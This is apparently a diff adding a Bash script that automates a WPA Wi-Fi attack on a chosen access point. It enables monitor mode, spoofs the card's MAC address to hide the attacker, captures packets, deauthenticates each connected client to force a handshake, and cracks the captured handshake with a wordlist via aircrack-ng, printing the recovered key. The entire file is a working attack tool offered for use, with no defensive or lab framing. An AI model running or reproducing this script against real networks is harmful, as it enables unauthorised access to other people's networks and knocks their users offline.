@@ -1,0 +1,243 @@
+#!/bin/bash
+
+# TODO: 
+# - write PIN + key to file with Perl after PIN recovery
+WIRELESS_INTERFACE="wlan0";
+
+################# FUNCTIONS ##############
+getKonsolePidByProcessName(){
+    ps aux | grep konsole | grep "$1" | awk -F" " '{print $2}'
+}
+
+# echo blue text
+echoBlue(){
+   echo "$(tput setaf 6)>>>>>> ${1}$(tput sgr0)";
+}
+
+# echo green text
+echoGreen(){
+   echo "$(tput setaf 2)>>>>>> ${1}$(tput sgr0)";
+}
+
+getWifiCardDriver(){
+    lshw -c network | gawk '!/wireless/ || !/driver/{ next; } { while(++i<=NF){ if($i ~ /driver\=/){ sub("driver=","",$i); print $i; } } }';
+}
+
+resetWifiCard(){
+  local WIFI_DRIVER=$(getWifiCardDriver);
+  local RESET_CARD_DRIVER_CMD="";
+  if [[ -z "$WIFI_DRIVER" ]]; then
+	echoBlue "Sorry couldn't get your WifiDriver";
+	echoBlue "Check if any wifi card is connected and try again";
+	echoBlue "You have to check getWifiCardDriver() function on your own...";
+	exit;
+  else 
+	echoBlue "I found that your WIFI driver is $WIFI_DRIVER ";
+	echoBlue "Resetting WIFI card ";
+	echoGreen "modprobe -r $WIFI_DRIVER && modprobe $WIFI_DRIVER";
+	modprobe -r $WIFI_DRIVER && modprobe $WIFI_DRIVER;
+  fi
+}
+
+stopMonitor() {
+	  echoGreen "killall airodump-ng" && killall airodump-ng &>/dev/null;
+	  echoGreen "killall aireplay-ng" && killall aireplay-ng &>/dev/null;
+	  echoGreen "airmon-ng stop mon0" && airmon-ng stop mon0;
+	  echoGreen "airmon-ng stop $WIRELESS_INTERFACE" && airmon-ng stop $WIRELESS_INTERFACE;
+	  echoGreen "airmon-ng check kill" && airmon-ng check kill;
+}
+restartMonitor() {
+      stopMonitor;
+      echoGreen "airmon-ng start $WIRELESS_INTERFACE" && airmon-ng start $WIRELESS_INTERFACE;
+}
+
+changeMacTo(){
+      echoBlue "ifconfig mon0 down" && ifconfig mon0 down;
+      echoBlue "macchanger -m $1 mon0" && macchanger -m $1 mon0;
+      echoBlue "ifconfig mon0 up" && ifconfig mon0 up;
+}
+getRandomMac(){
+      echo $(perl -e 'sub l{":".int(rand(9)).int(rand(9));}; print "02".l.l.l.l.l;');
+}
+
+################# FUNCTIONS END ##########
+
+
+
+############# PARSING OPTIONS #####################
+BSSID="";
+CHANNEL="";
+WORDLIST_FILE="./someDictionary.txt";
+SPOOFED_MAC="";
+HANDSHAKE_GRAB=0
+
+while getopts "c:b:w:s:h" opt; do
+    case "$opt" in
+    b)  BSSID=$OPTARG
+        ;;
+    c)  CHANNEL=$OPTARG
+        ;;
+    w)  WORDLIST_FILE=$OPTARG
+        ;;
+    s)  SPOOFED_MAC=$OPTARG
+        ;;
+    h)  HANDSHAKE_GRAB=1
+        ;;
+    esac
+done
+
+if [[ -z "$BSSID" || -z "$CHANNEL" ]]; then
+  echo "Using: $0 [OPTIONS]";
+  echo "[OPTIONS]:";
+  echo "   -b [BSSID] - you must give bssid of target access point";
+  echo "   -c [CHANNEL] - you must give channel of target access point";
+  echo "   -w [WORDLIST_FILE_PATH] - path to file containing dictionary";
+  echo "   -s [SPOOFED_MAC] - if you want to spoof (change) mac address of your wifi card (safety)";
+  echo "   -h only grab handshake for [BSSID] and exit (don't proceed with aircrack)";
+  exit;
+fi
+
+# not just handshake grab && no wordlist file
+if [ $HANDSHAKE_GRAB == 0 ] && [ ! -f "$WORDLIST_FILE" ]; then
+    echoBlue "Wordlist file '$WORDLIST_FILE' doesn't exist, please specify valid file";
+    exit;
+fi
+
+############# PARSING OPTIONS END  ###############
+
+resetWifiCard
+restartMonitor
+
+## use random mac (for safety)
+RANDOM_MAC=$(getRandomMac)
+changeMacTo $RANDOM_MAC;
+
+if [[ -z $(ifconfig | grep mon0) ]]; then
+  echo "Something is wrong, can't start monitor mode for wlan0";
+  exit;
+fi
+
+CURRENT_DIR=$(pwd);
+#capitalize BSSID (in case user gives small letters)
+BSSID=$(perl -e 'print uc($ARGV[0]);' "${BSSID}");
+BSSID_CLEAR=$(echo $BSSID | sed s/://g);
+AIRODUMP_LOG_DIR="${CURRENT_DIR}/airodump_logs";
+BSSID_LOG="${AIRODUMP_LOG_DIR}/${BSSID_CLEAR}.log";
+CAP_FILE_1="${BSSID_LOG}-01.cap";
+CAP_FILE_WILDARD="${BSSID_LOG}-*.cap";
+TMP_CONNECTED_CLIENTS="/tmp/WPA-Attack-connected-clients_${BSSID_CLEAR}";
+TMP_WPA_HANDSHAKE_GRABBED="/tmp/WPA-Attack-handshake-grabbed_${BSSID_CLEAR}";
+NETWORK_CLIENT_MAC="";
+# Crack password using password file list
+KEY_FOUND_LOG="${CURRENT_DIR}/KEY_FOUND_${BSSID_CLEAR}";
+
+
+# spoofed mac ?
+if [[ ! -z "$SPOOFED_MAC" ]]; then
+  ifconfig mon0 down
+  macchanger -m $SPOOFED_MAC mon0
+  ifconfig mon0 up
+fi
+
+if [[ ! -d $AIRODUMP_LOG_DIR ]]; then
+    mkdir -m 700 $AIRODUMP_LOG_DIR;
+fi
+
+# remove old logs for BSSID
+rm "$CAP_FILE_WILDARD" 2>/dev/null;
+
+if [[ -f $TMP_CONNECTED_CLIENTS ]]; then
+    rm $TMP_CONNECTED_CLIENTS 2>/dev/null;
+fi
+
+if [[ -f $TMP_WPA_HANDSHAKE_GRABBED ]]; then
+    rm $TMP_WPA_HANDSHAKE_GRABBED 2>/dev/null;
+fi
+
+####################### LOGGING PACKETS BY AIRODUMP-NG ###########################################
+
+LOGGING_PACKETS='airodump-ng --showack --bssid='$BSSID' -c '$CHANNEL' -w '$BSSID_LOG' mon0 2>&1 \
+		| perl -e '\'' 
+		    my @clientMacs="";
+		    while(<>){
+			# search connected client
+			if(/'$BSSID'\s+([A-F0-9]{2}:[A-F0-9]{2}:[A-F0-9]{2}:[A-F0-9]{2}:[A-F0-9]{2}:[A-F0-9]{2})/){
+			    # element is not in array
+			     if( !($1 ~~ @clientMacs) ){
+				push(@clientMacs,$1);
+				open TMP_FILE, ">>'$TMP_CONNECTED_CLIENTS'";
+				print TMP_FILE "$1\n";
+				close TMP_FILE;
+			      }
+			}
+			# if we find WPA-Hanshake we can kill the process
+			if(/WPA handshake:/){ 
+			      print $_;
+			      system("touch '$TMP_WPA_HANDSHAKE_GRABBED'");
+			      system("killall -INT airodump-ng");
+			      exit;
+			}
+			print $_;
+		    }
+		  '\''  ';
+konsole -hold -e /bin/sh -c "$LOGGING_PACKETS" 2>/dev/null;
+echoGreen "airodump-ng mon0 --bssid=$BSSID -c $CHANNEL -w $BSSID_LOG";
+
+
+echoBlue "Waiting for clients and WPA-Handshake...";
+IFS=$'\n';
+while true; do
+      if [[ -f $TMP_CONNECTED_CLIENTS ]]; then
+	  NETWORK_CLIENTS_MAC=$(cat $TMP_CONNECTED_CLIENTS);
+	  for SINGLE_CLIENT in $NETWORK_CLIENTS_MAC; do 
+		# Deauthenticate single wireless client (force him to another connection and grab WPA Hanshake)
+		DEAUTH_CMD="aireplay-ng -0 10 -a $BSSID -c $SINGLE_CLIENT mon0";
+		echoBlue "Trying to deauthenticate connected client: $SINGLE_CLIENT ...";
+		echoGreen "$DEAUTH_CMD";
+		konsole -e /bin/sh -c "$DEAUTH_CMD" 2>/dev/null
+		sleep 15;
+		if [[ -f $TMP_WPA_HANDSHAKE_GRABBED ]]; then
+		    echoBlue "WPA Handshake from BSSID $BSSID was grabbed!!!";
+		    rm $TMP_WPA_HANDSHAKE_GRABBED;
+		    break 2;
+		fi
+	  done
+	  #echo $DEAUTH_CMD;
+      fi  
+      sleep 30;
+done
+
+# if only grabbing handshake - exit after that
+if [[ $HANDSHAKE_GRAB == 1 ]]; then
+    echoBlue "Handshake was logged to: ${CAP_FILE_1}";
+    echoBlue "You can use following command to crack it:";
+    echoBlue "aircrack-ng -l ${CURRENT_DIR}/KEY_FOUND_${BSSID_CLEAR} -w ${WORDLIST_FILE} -b ${BSSID} ${CAP_FILE_WILDARD}";
+    echoBlue "You used -h option (exit after handshake grab)";
+    exit;
+fi
+
+################## CRACKING .cap file using wordlist file ############################################
+
+
+
+# example command:
+#   aircrack-ng -l KEY_FOUND -w ./wordlistExample.txt -b 00:02:72:55:FF:C0 ./airodump_logs/00027255FFC0*.cap
+AIRCRACK_CMD="aircrack-ng -l ${KEY_FOUND_LOG} -w ${WORDLIST_FILE} -b ${BSSID} ${CAP_FILE_WILDARD}";
+konsole -hold -e /bin/sh -c "${AIRCRACK_CMD}" 2>/dev/null;
+echoGreen $AIRCRACK_CMD;
+
+echoBlue "Aircrack will write results to ${KEY_FOUND_LOG}...";
+# periodical checking if KEY_FOUND file exists
+while true; do
+  if [[ -f $KEY_FOUND_LOG ]]; then
+      kill -INT $(getKonsolePidByProcessName aireplay-ng)
+      killall -INT aireplay-ng
+      echoBlue "!!!! KEY WAS FOUND !!!!"
+      echoBlue "---------- YOUR WPA KEY IS: ----------------"
+      echoBlue $(cat $KEY_FOUND_LOG)
+      echoBlue "--------------------------------------------"
+      echoBlue "You have it also in file: $KEY_FOUND_LOG"
+      exit;
+  fi
+  sleep 30;
+done
